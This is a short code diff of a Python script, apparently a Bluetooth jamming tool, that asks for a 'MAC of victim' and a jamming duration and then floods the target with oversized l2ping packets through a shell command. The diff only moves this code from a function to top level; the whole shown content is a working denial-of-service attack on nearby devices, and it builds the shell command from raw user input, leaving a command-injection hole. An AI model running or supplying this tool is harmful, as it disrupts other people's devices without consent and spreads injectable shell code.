@@ -11,14 +11,14 @@ def start():
 
 start()
 
-def standart():
-    mac = input("MAC of victim: ")
-    time = input("Time of jamming: ")
 
-    xterm_1 = "timeout %ss l2ping -i hci0 -s 600 -f %s &" % (time, mac)
-    print("Start jamming...")
+mac = input("MAC of victim: ")
+time = input("Time of jamming: ")
 
-    subprocess.Popen(xterm_1, stdout=subprocess.PIPE , stderr=subprocess.PIPE,shell=True)
+xterm_1 = "timeout %ss l2ping -i hci0 -s 600 -f %s &" % (time, mac)
+print("Start jamming...")
+
+subprocess.Popen(xterm_1, stdout=subprocess.PIPE , stderr=subprocess.PIPE,shell=True)
 
 
 
